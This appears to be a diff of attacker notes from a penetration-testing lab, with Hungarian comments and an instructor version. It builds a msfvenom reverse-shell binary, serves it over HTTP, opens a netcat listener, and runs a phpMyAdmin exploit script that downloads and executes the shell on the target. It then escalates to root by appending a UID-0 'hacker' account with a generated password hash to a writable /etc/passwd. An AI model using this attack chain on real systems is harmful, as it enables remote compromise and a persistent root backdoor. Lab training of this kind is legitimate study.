@@ -1,5 +1,41 @@
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=30.0.0.9 LPORT=4444 -f elf >shell.elf
 python3 -m http.server
+nc -lvp 4444
 python3 50457.py 40.0.5.8 80 /phpmyadmin pma pmapass "cd /tmp; rm -f /tmp/self.elf; wget http://30.0.0.9:8000/shell.elf; chmod 777 /tmp/shell.elf; /tmp/shell.elf"
 python3 -c "import pty;pty.spawn('/bin/bash')"
 
+--------------------------------------------------------------------------------------------
+
+HA ÍRHATJUK A /etc/passwd ÁLLOMÁNYT:
+
+EZT ADJUK HOZZÁ A /etc/passwd végéhez:
+hacker:JELSZO:0:0:hacker_user:/root:/bin/bash
+
+JELSZO elkészítése a támadó gépen:
+openssl passwd -5 alma
+
+Elkészült jelszó(változik):$5$yRgbNvIoWqbDhdvT$vlp45G2ftHt/aHu3vh7CerX6Fdk3lM9uDgx9HXxiho4
+
+Így a végleges parancs:
+
+echo 'hacker:$5$yRgbNvIoWqbDhdvT$vlp45G2ftHt/aHu3vh7CerX6Fdk3lM9uDgx9HXxiho4:0:0:hacker_user:/root:/bin/bash' >> /etc/passwd
+
+------------------------------------------------------------------------------------------
+Oktatói verzió:
+HA IRHATJUK A /etc/passwd ALLOMANYT:
+ 
+Ezt adjuk hozza a /etc/passwd vegehez:
+ 
+hacker:JELSZO:0:0:hacker user:/root:/bin/bash
+ 
+JELSZO elkeszitese a tamado gepen (a jelszo itt most alma lesz):
+openssl passwd -5 alma
+ 
+A nalam elkeszult jelszo: $5$J3duGPV3dWN.YVO2$zrMkCO1ljY2t.EamYPeOYd.xnidpX.sBlUWRR53QN22
+ 
+Igy a vegleges parancs (nagyon fontos, hogy az echo utan egyszeres '-et hasznaljunk):
+ 
+ELV: echo 'blabla' >> /etc/passwd
+ 
+ 
+echo 'hacker:$5$J3duGPV3dWN.YVO2$zrMkCO1ljY2t.EamYPeOYd.xnidpX.sBlUWRR53QN22:0:0:hacker user:/root:/bin/bash' >> /etc/passwd
